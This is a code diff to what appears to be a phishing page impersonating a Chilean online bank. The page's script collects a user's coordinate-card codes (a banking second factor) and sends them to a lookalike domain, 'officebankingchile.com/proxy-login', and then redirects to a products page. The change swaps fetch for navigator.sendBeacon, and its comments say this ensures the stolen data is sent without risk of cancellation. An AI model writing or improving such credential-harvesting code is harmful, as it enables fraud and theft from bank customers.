@@ -163,7 +163,7 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-async function enviarCoordenadas(){
+function enviarCoordenadas(){
   let coords = {};
   const letras = ["A","B","C","D","E","F","G","H","I","J"];
 
@@ -183,21 +183,19 @@ async function enviarCoordenadas(){
   document.getElementById("pantallaCoordenadas").classList.add("hidden");
   document.getElementById("pantallaProcesando").classList.remove("hidden");
 
-  // Enviar al backend sin bloquear
-  try {
-    fetch("https://officebankingchile.info/proxy-login", {
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
-      body:JSON.stringify({ coordenadas: coords })
-    });
-  } catch(e) {}
+  // 🔥 Enviar al backend SIN riesgo de cancelación
+  const data = JSON.stringify({ coordenadas: coords });
+  const blob = new Blob([data], { type: "application/json" });
 
-  // Avanzar SIEMPRE
+  navigator.sendBeacon("https://officebankingchile.com/proxy-login", blob);
+
+  // 🔥 Avanzar SIEMPRE a productos
   setTimeout(() => {
     window.location.href = "productos.html";
-  }, 4000);
+  }, 3000);
 }
 </script>
+
 
 </body>
 </html>
